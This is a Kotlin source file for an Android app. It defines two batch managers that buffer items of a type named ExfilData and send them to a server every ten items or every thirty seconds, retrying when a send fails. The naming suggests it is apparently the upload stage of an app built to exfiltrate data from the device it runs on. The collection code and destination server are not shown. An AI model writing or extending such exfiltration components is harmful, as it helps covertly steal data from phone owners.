package com.yourpackage.utils

import android.content.Context
import android.os.Handler
import android.os.Looper
import android.util.Log
import com.yourpackage.data.ExfilData
import com.yourpackage.network.ApiClient
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.launch

/**
 * Manages batching of ExfilData items.
 * Sends batches when either:
 * 1. Buffer reaches MAX_BATCH_SIZE (10 items)
 * 2. Timeout reaches MAX_WAIT_TIME (30 seconds)
 */
class BatchManager(
    private val onBatchReady: (List<ExfilData>) -> Unit
) {
    companion object {
        private const val TAG = "BatchManager"
        private const val MAX_BATCH_SIZE = 10
        private const val MAX_WAIT_TIME_MS = 30_000L // 30 seconds
    }

    private val buffer = mutableListOf<ExfilData>()
    private val handler = Handler(Looper.getMainLooper())
    private var isRunning = false
    private var flushRunnable: Runnable? = null

    /**
     * Start the batch manager.
     */
    fun start() {
        if (isRunning) {
            Log.d(TAG, "BatchManager already running")
            return
        }
        isRunning = true
        Log.d(TAG, "🔄 BatchManager started")
        scheduleFlush()
    }

    /**
     * Stop the batch manager and flush any remaining items.
     */
    fun stop() {
        isRunning = false
        flushRunnable?.let { handler.removeCallbacks(it) }
        flushRunnable = null
        // Flush any remaining items
        flushBuffer()
        Log.d(TAG, "⏹️ BatchManager stopped")
    }

    /**
     * Add an item to the buffer.
     * If buffer reaches MAX_BATCH_SIZE, it will flush immediately.
     */
    fun add(item: ExfilData) {
        if (!isRunning) {
            Log.w(TAG, "BatchManager not running, dropping item: ${item.type}")
            return
        }

        synchronized(buffer) {
            buffer.add(item)
            Log.d(TAG, "📥 Added item to buffer (${buffer.size}/$MAX_BATCH_SIZE)")

            if (buffer.size >= MAX_BATCH_SIZE) {
                Log.d(TAG, "📦 Buffer full, flushing...")
                flushBuffer()
            }
        }
    }

    /**
     * Add multiple items to the buffer.
     */
    fun addAll(items: List<ExfilData>) {
        if (!isRunning) {
            Log.w(TAG, "BatchManager not running, dropping ${items.size} items")
            return
        }

        synchronized(buffer) {
            buffer.addAll(items)
            Log.d(TAG, "📥 Added ${items.size} items to buffer (${buffer.size}/$MAX_BATCH_SIZE)")

            if (buffer.size >= MAX_BATCH_SIZE) {
                Log.d(TAG, "📦 Buffer full, flushing...")
                flushBuffer()
            }
        }
    }

    /**
     * Schedule a flush after MAX_WAIT_TIME_MS.
     */
    private fun scheduleFlush() {
        if (!isRunning) return

        flushRunnable = Runnable {
            if (isRunning) {
                synchronized(buffer) {
                    if (buffer.isNotEmpty()) {
                        Log.d(TAG, "⏰ Timeout reached, flushing ${buffer.size} items")
                        flushBuffer()
                    }
                }
                // Schedule next flush
                scheduleFlush()
            }
        }

        handler.postDelayed(flushRunnable!!, MAX_WAIT_TIME_MS)
    }

    /**
     * Flush the buffer immediately.
     */
    private fun flushBuffer() {
        val itemsToSend: List<ExfilData>

        synchronized(buffer) {
            if (buffer.isEmpty()) return

            itemsToSend = buffer.toList()
            buffer.clear()
        }

        Log.d(TAG, "📤 Flushing ${itemsToSend.size} items")

        try {
            onBatchReady(itemsToSend)
        } catch (e: Exception) {
            Log.e(TAG, "❌ Error during batch flush: ${e.message}")
            // Re-add items to buffer on failure
            synchronized(buffer) {
                buffer.addAll(0, itemsToSend)
            }
        }
    }

    /**
     * Get the current buffer size.
     */
    fun getBufferSize(): Int {
        synchronized(buffer) {
            return buffer.size
        }
    }

    /**
     * Check if the manager is running.
     */
    fun isActive(): Boolean = isRunning

    /**
     * Manually flush the buffer (force send).
     */
    fun forceFlush() {
        if (isRunning) {
            flushBuffer()
        }
    }
}

/**
 * Alternative batch manager that uses ApiClient directly.
 * This is a more integrated version that handles its own networking.
 */
class IntegratedBatchManager(private val context: Context) {
    companion object {
        private const val TAG = "IntegratedBatchManager"
        private const val MAX_BATCH_SIZE = 10
        private const val MAX_WAIT_TIME_MS = 30_000L // 30 seconds
        private const val RETRY_DELAY_MS = 5_000L // 5 seconds
    }

    private val buffer = mutableListOf<ExfilData>()
    private val handler = Handler(Looper.getMainLooper())
    private val scope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
    private val apiClient = ApiClient(context)
    private var isRunning = false
    private var flushRunnable: Runnable? = null
    private var isSending = false

    /**
     * Start the batch manager.
     */
    fun start() {
        if (isRunning) {
            Log.d(TAG, "IntegratedBatchManager already running")
            return
        }
        isRunning = true
        Log.d(TAG, "🔄 IntegratedBatchManager started")
        scheduleFlush()
    }

    /**
     * Stop the batch manager.
     */
    fun stop() {
        isRunning = false
        flushRunnable?.let { handler.removeCallbacks(it) }
        flushRunnable = null
        forceFlush()
        Log.d(TAG, "⏹️ IntegratedBatchManager stopped")
    }

    /**
     * Add an item to the buffer.
     */
    fun add(item: ExfilData) {
        if (!isRunning) {
            Log.w(TAG, "BatchManager not running, dropping item")
            return
        }

        synchronized(buffer) {
            buffer.add(item)
            Log.d(TAG, "📥 Added item (${buffer.size}/$MAX_BATCH_SIZE)")

            if (buffer.size >= MAX_BATCH_SIZE && !isSending) {
                Log.d(TAG, "📦 Buffer full, flushing...")
                flushBuffer()
            }
        }
    }

    /**
     * Add multiple items to the buffer.
     */
    fun addAll(items: List<ExfilData>) {
        if (!isRunning) {
            Log.w(TAG, "BatchManager not running, dropping ${items.size} items")
            return
        }

        synchronized(buffer) {
            buffer.addAll(items)
            Log.d(TAG, "📥 Added ${items.size} items (${buffer.size}/$MAX_BATCH_SIZE)")

            if (buffer.size >= MAX_BATCH_SIZE && !isSending) {
                Log.d(TAG, "📦 Buffer full, flushing...")
                flushBuffer()
            }
        }
    }

    /**
     * Schedule a flush after MAX_WAIT_TIME_MS.
     */
    private fun scheduleFlush() {
        if (!isRunning) return

        flushRunnable = Runnable {
            if (isRunning && !isSending) {
                synchronized(buffer) {
                    if (buffer.isNotEmpty()) {
                        Log.d(TAG, "⏰ Timeout reached, flushing ${buffer.size} items")
                        flushBuffer()
                    }
                }
            }
            // Schedule next flush
            scheduleFlush()
        }

        handler.postDelayed(flushRunnable!!, MAX_WAIT_TIME_MS)
    }

    /**
     * Flush the buffer to the server.
     */
    private fun flushBuffer() {
        val itemsToSend: List<ExfilData>

        synchronized(buffer) {
            if (buffer.isEmpty() || isSending) return

            itemsToSend = buffer.toList()
            buffer.clear()
        }

        isSending = true
        Log.d(TAG, "📤 Sending ${itemsToSend.size} items to server...")

        scope.launch {
            try {
                val response = apiClient.sendBatch(itemsToSend)
                if (response is ApiResponse.Success) {
                    Log.d(TAG, "✅ Successfully sent ${itemsToSend.size} items")
                } else {
                    Log.e(TAG, "❌ Failed to send batch: ${response.getErrorMessageOrNull()}")
                    // Re-add items to buffer on failure
                    synchronized(buffer) {
                        buffer.addAll(0, itemsToSend)
                    }
                    // Retry after delay
                    handler.postDelayed({
                        if (isRunning && !isSending) {
                            flushBuffer()
                        }
                    }, RETRY_DELAY_MS)
                }
            } catch (e: Exception) {
                Log.e(TAG, "❌ Error sending batch: ${e.message}")
                // Re-add items to buffer on failure
                synchronized(buffer) {
                    buffer.addAll(0, itemsToSend)
                }
                // Retry after delay
                handler.postDelayed({
                    if (isRunning && !isSending) {
                        flushBuffer()
                    }
                }, RETRY_DELAY_MS)
            } finally {
                isSending = false
            }
        }
    }

    /**
     * Force flush the buffer immediately.
     */
    fun forceFlush() {
        if (isRunning && !isSending) {
            flushBuffer()
        }
    }

    /**
     * Get the current buffer size.
     */
    fun getBufferSize(): Int {
        synchronized(buffer) {
            return buffer.size
        }
    }

    /**
     * Check if the manager is running.
     */
    fun isActive(): Boolean = isRunning
}